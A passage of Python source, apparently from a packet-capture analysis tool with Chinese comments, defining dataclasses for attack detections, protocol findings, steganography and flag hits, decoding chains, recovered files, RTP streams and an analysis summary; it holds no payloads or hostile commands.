                attack_value = attack_type.value if hasattr(attack_type, 'value') else str(attack_type)
                tags.append(attack_value)

        # 没标签的话用检测类型凑一个
        if not tags and detection_type != DetectionType.ATTACK:
            tags.append(detection_type.display_name)

        # 权重和置信度
        if is_dict:
            total_weight = attack_result.get('total_weight', 0)
            confidence = attack_result.get('confidence', 'none')
            # 补充未传入的字段
            if not method:
                method = attack_result.get('method', '')
            if not uri:
                uri = attack_result.get('uri', '')
            if not source_ip:
                source_ip = attack_result.get('src_ip', '')
            if not dest_ip:
                dest_ip = attack_result.get('dst_ip', '')
            if not timestamp:
                timestamp = attack_result.get('timestamp', '')
            if packet_number == 0:
                packet_number = attack_result.get('frame_number', 0)
            tcp_stream_val = attack_result.get('tcp_stream', -1)
        else:
            total_weight = getattr(attack_result, 'total_weight', 0)
            confidence = getattr(attack_result, 'confidence', 'none')
            tcp_stream_val = -1

        # 原始请求信息
        raw_request = ''
        raw_headers = ''
        raw_body = ''
        response_data_val = ''
        response_sample_val = ''
        if is_dict:
            raw_request = attack_result.get('raw_http_request', '')
            raw_headers = attack_result.get('raw_request_headers', '')
            raw_body = attack_result.get('raw_request_body', '')
            response_data_val = attack_result.get('response_data', '')
            response_sample_val = attack_result.get('response_sample', '')

        return cls(
            detection_type=detection_type,
            threat_level=threat_level,
            timestamp=timestamp,
            method=method,
            uri=uri,
            source_ip=source_ip,
            dest_ip=dest_ip,
            total_weight=total_weight,
            confidence=confidence,
            indicators=indicators,
            indicator=indicator_str,
            tags=tags,
            packet_number=packet_number,
            tcp_stream=tcp_stream_val,
            response_data=response_data_val if response_data_val else None,
            response_sample=response_sample_val,
            raw_data=raw_request if raw_request else None,
            raw_result=dict(attack_result) if is_dict else None,
            ast_findings=attack_result.get('ast_findings', []) if is_dict else [],
            obfuscation_score=attack_result.get('obfuscation_score', 0.0) if is_dict else 0.0,
            semantic_validated=attack_result.get('semantic_validated', False) if is_dict else False,
        )


@dataclass
class ProtocolStats:
    protocol: str
    count: int
    percentage: float = 0.0
    children: List['ProtocolStats'] = field(default_factory=list)

    @property
    def display_text(self) -> str:
        return f"{self.protocol} ({self.count})"

    @property
    def name(self) -> str:
        return self.protocol


@dataclass
class ExtractedFile:
    file_path: str
    file_name: str
    file_type: str
    file_size: int
    source_packet: int = 0          # 关联的 frame number（用于获取原始包）
    content_type: str = ""
    # 以下字段用于懒加载（点击时填充）
    hex_dump: str = ""              # 十六进制 dump
    protocol_layers: List[str] = field(default_factory=list)  # 协议分层信息
    pcap_path: str = ""             # 原始 pcap 文件路径（用于懒加载时查询）
    # 懒加载是否已经**尝试过**（成功或失败都算）。
    # 不能拿 hex_dump / protocol_layers 非空来判断：0 字节的提取文件 hex_dump
    # 就是空串，取不到协议分层时列表也是空的 —— 用空值当"还没加载"，这两种情况
    # 就会在每次点击时重跑一遍那个起 tshark 子进程的懒加载。
    lazy_loaded: bool = False


@dataclass
class ProtocolFinding:
    """协议分析发现 (如ICMP隐写检测)"""
    id: str = field(default_factory=lambda: str(uuid.uuid4()))
    protocol: str = ""              # 协议类型: "ICMP", "DNS", "FTP" 等
    finding_type: str = ""          # 发现类型: "hidden_data", "anomaly" 等
    title: str = ""                 # 标题: "TTL序列隐写"
    description: str = ""           # 详细说明
    data: Optional[str] = None      # 提取的原始数据（可能是编码的）
    decoded_data: Optional[str] = None  # 自动解码后的数据
    decode_chain: str = ""          # 解码链，如 "base64 -> hex"
    confidence: float = 0.0         # 置信度 0.0-1.0
    is_flag: bool = False           # 是否疑似FLAG
    raw_values: List[Any] = field(default_factory=list)  # 原始值序列

    @classmethod
    def from_analyzer_finding(cls, finding) -> "ProtocolFinding":
        """从 protocol_analyzer.AnalysisFinding 转换"""
        return cls(
            protocol=finding.protocol.value.upper() if hasattr(finding.protocol, 'value') else str(finding.protocol),
            finding_type=finding.finding_type.value if hasattr(finding.finding_type, 'value') else str(finding.finding_type),
            title=finding.title,
            description=finding.description,
            data=finding.data,
            confidence=finding.confidence,
            is_flag=finding.is_flag,
            raw_values=list(finding.raw_values) if finding.raw_values else []
        )

    def to_dict(self) -> Dict:
        return {
            'id': self.id,
            'protocol': self.protocol,
            'finding_type': self.finding_type,
            'title': self.title,
            'description': self.description,
            'data': self.data,
            'decoded_data': self.decoded_data,
            'decode_chain': self.decode_chain,
            'confidence': self.confidence,
            'is_flag': self.is_flag,
            'raw_values': self.raw_values
        }

    @property
    def display_title(self) -> str:
        prefix = "⚠ " if self.is_flag else ""
        suffix = " [FLAG]" if self.is_flag else ""
        return f"{prefix}{self.title}{suffix}"

    @property
    def confidence_display(self) -> str:
        if self.confidence >= 0.8:
            return "高"
        elif self.confidence >= 0.5:
            return "中"
        else:
            return "低"


@dataclass
class AutoDecodingResult:
    """自动解码结果"""
    id: str = field(default_factory=lambda: str(uuid.uuid4()))
    source: str = ""                    # 来源: "http_param", "payload", "file"
    original_data: str = ""             # 原始数据 (hex或文本)
    final_data: str = ""                # 最终解码数据
    decode_chain: str = ""              # 解码链: "base64 -> gzip -> text"
    total_layers: int = 0               # 解码层数
    is_meaningful: bool = False         # 是否有意义
    confidence: float = 0.0             # 置信度
    detected_type: str = ""             # 检测到的内容类型
    flags_found: List[str] = field(default_factory=list)  # 发现的Flag
    associated_detection_id: str = ""   # 关联的检测结果ID

    @property
    def display_title(self) -> str:
        if self.flags_found:
            return f"[FLAG] {self.decode_chain}"
        return f"{self.decode_chain} ({self.total_layers}层)"

    def to_dict(self) -> Dict:
        return {
            'id': self.id,
            'source': self.source,
            'original_data': self.original_data[:200] if self.original_data else "",
            'final_data': self.final_data[:500] if self.final_data else "",
            'decode_chain': self.decode_chain,
            'total_layers': self.total_layers,
            'is_meaningful': self.is_meaningful,
            'confidence': self.confidence,
            'detected_type': self.detected_type,
            'flags_found': self.flags_found
        }


@dataclass
class FileRecoveryResult:
    """文件还原结果"""
    id: str = field(default_factory=lambda: str(uuid.uuid4()))
    detected: bool = False              # 是否检测到文件
    extension: str = ""                 # 文件扩展名
    description: str = ""               # 文件描述
    mime_type: str = ""                 # MIME类型
    category: str = ""                  # 文件类别: archive, image, audio, etc.
    confidence: float = 0.0             # 置信度
    size: int = 0                       # 文件大小
    offset: int = 0                     # 在原始数据中的偏移
    source_packet: int = 0              # 来源数据包号
    saved_path: str = ""                # 保存路径 (如果已保存)
    data_preview: str = ""              # 数据预览 (hex)

    @property
    def display_title(self) -> str:
        size_str = self._format_size(self.size)
        return f"{self.description} ({size_str})"

    @staticmethod
    def _format_size(size: int) -> str:
        if size < 1024:
            return f"{size} B"
        elif size < 1024 * 1024:
            return f"{size / 1024:.1f} KB"
        else:
            return f"{size / (1024 * 1024):.1f} MB"

    def to_dict(self) -> Dict:
        return {
            'id': self.id,
            'detected': self.detected,
            'extension': self.extension,
            'description': self.description,
            'mime_type': self.mime_type,
            'category': self.category,
            'confidence': self.confidence,
            'size': self.size,
            'offset': self.offset,
            'source_packet': self.source_packet,
            'saved_path': self.saved_path
        }


@dataclass
class RTPStreamInfo:
    """RTP 音视频流信息"""
    id: str = field(default_factory=lambda: str(uuid.uuid4()))
    ssrc: str = ""
    src_addr: str = ""
    dst_addr: str = ""
    payload_type: int = 0
    codec_name: str = ""
    media_type: str = ""         # "audio" | "video"
    sample_rate: int = 0
    packets: int = 0
    lost: int = 0
    max_jitter: float = 0.0
    duration_sec: float = 0.0
    pcap_path: str = ""

    @property
    def display_title(self) -> str:
        duration = f"{self.duration_sec:.1f}s" if self.duration_sec > 0 else "未知时长"
        return f"{self.codec_name} ({self.media_type}) - {duration}"

    def to_dict(self) -> Dict:
        return {
            'id': self.id,
            'ssrc': self.ssrc,
            'src_addr': self.src_addr,
            'dst_addr': self.dst_addr,
            'payload_type': self.payload_type,
            'codec_name': self.codec_name,
            'media_type': self.media_type,
            'sample_rate': self.sample_rate,
            'packets': self.packets,
            'lost': self.lost,
            'max_jitter': self.max_jitter,
            'duration_sec': self.duration_sec,
        }


@dataclass
class AttackDetectionInfo:
    """攻击检测结果"""
    id: str = field(default_factory=lambda: str(uuid.uuid4()))
    attack_type: str = ""               # 攻击类型: "SQL Injection", "XSS" 等
    risk_level: str = "info"            # 风险等级: info, low, medium, high, critical
    confidence: str = "low"             # 置信度: low, medium, high
    total_weight: int = 0               # 总权重
    matched_signatures: List[str] = field(default_factory=list)  # 匹配的签名名称
    matched_text: str = ""              # 匹配的文本
    context: str = ""                   # 上下文（包含匹配位置的原始文本）
    source_uri: str = ""                # 来源 URI
    source_packet: int = 0              # 来源数据包号
    source_ip: str = ""                 # 源 IP
    dest_ip: str = ""                   # 目标 IP
    method: str = ""                    # HTTP 方法
    timestamp: str = ""                 # 时间戳
    raw_matches: List[Dict] = field(default_factory=list)  # 原始匹配结果

    @property
    def display_title(self) -> str:
        risk_icon = {
            "critical": "[!!!]",
            "high": "[!!]",
            "medium": "[!]",
            "low": "[.]",
            "info": "[i]"
        }.get(self.risk_level, "")
        return f"{risk_icon} {self.attack_type}"

    @property
    def risk_level_display(self) -> str:
        names = {
            "info": "信息",
            "low": "低危",
            "medium": "中危",
            "high": "高危",
            "critical": "严重"
        }
        return names.get(self.risk_level, self.risk_level)

    @property
    def risk_level_color(self) -> str:
        colors = {
            "info": "#2196F3",
            "low": "#4CAF50",
            "medium": "#FF9800",
            "high": "#F44336",
            "critical": "#9C27B0"
        }
        return colors.get(self.risk_level, "#757575")

    def to_dict(self) -> Dict:
        return {
            'id': self.id,
            'attack_type': self.attack_type,
            'risk_level': self.risk_level,
            'confidence': self.confidence,
            'total_weight': self.total_weight,
            'matched_signatures': self.matched_signatures,
            'matched_text': self.matched_text[:200] if self.matched_text else "",
            'context': self.context[:500] if self.context else "",
            'source_uri': self.source_uri,
            'source_packet': self.source_packet,
            'source_ip': self.source_ip,
            'dest_ip': self.dest_ip,
            'method': self.method,
            'timestamp': self.timestamp
        }

    @classmethod
    def from_attack_detection_result(cls, result, packet_info: Dict = None) -> "AttackDetectionInfo":
        """从 AttackDetectionResult 创建"""
        packet_info = packet_info or {}

        attack_type = ""
        if result.attack_types:
            first_type = result.attack_types[0]
            attack_type = first_type.value if hasattr(first_type, 'value') else str(first_type)

        matched_signatures = []
        matched_texts = []
        raw_matches = []
        for match in result.matches:
            matched_signatures.append(match.signature.name)
            matched_texts.append(match.matched_text)
            raw_matches.append({
                'name': match.signature.name,
                'pattern': match.signature.pattern,
                'weight': match.signature.weight,
                'matched_text': match.matched_text,
                'description': match.signature.description
            })

        return cls(
            attack_type=attack_type,
            risk_level=result.risk_level,
            confidence=result.confidence,
            total_weight=result.total_weight,
            matched_signatures=matched_signatures,
            matched_text="; ".join(matched_texts[:3]),
            context=packet_info.get('raw_body', ''),
            source_uri=packet_info.get('uri', ''),
            source_packet=packet_info.get('packet_number', 0),
            source_ip=packet_info.get('source_ip', ''),
            dest_ip=packet_info.get('dest_ip', ''),
            method=packet_info.get('method', ''),
            timestamp=packet_info.get('timestamp', ''),
            raw_matches=raw_matches
        )


@dataclass
class AnalysisSummary:
    file_path: str = ""
    total_packets: int = 0
    protocol_stats: List[ProtocolStats] = field(default_factory=list)
    detections: List[DetectionResult] = field(default_factory=list)
    extracted_files: List[ExtractedFile] = field(default_factory=list)
    protocol_findings: List[ProtocolFinding] = field(default_factory=list)  # 协议分析发现
    decoding_results: List[AutoDecodingResult] = field(default_factory=list)  # 自动解码结果
    recovered_files: List[FileRecoveryResult] = field(default_factory=list)
    rtp_streams: List[RTPStreamInfo] = field(default_factory=list)
    attack_detections: List[AttackDetectionInfo] = field(default_factory=list)
    analysis_time: float = 0.0

    @property
    def threat_count(self) -> int:
        return len(self.detections)

    @property
    def high_confidence_count(self) -> int:
        return self._confidence_count("high")

    @property
    def medium_confidence_count(self) -> int:
        return self._confidence_count("medium")

    @property
    def low_confidence_count(self) -> int:
        return self._confidence_count("low")

    def _confidence_count(self, level: str) -> int:
        count = 0
        for detection in self.detections:
            if str(getattr(detection, "confidence", "")).lower() == level:
                count += 1
        for detection in self.attack_detections:
            if str(getattr(detection, "confidence", "")).lower() == level:
                count += 1
        return count

    @property
    def detection_by_type(self) -> Dict[DetectionType, List[DetectionResult]]:
        grouped = {}
        for det in self.detections:
            if det.detection_type not in grouped:
                grouped[det.detection_type] = []
            grouped[det.detection_type].append(det)
        return grouped

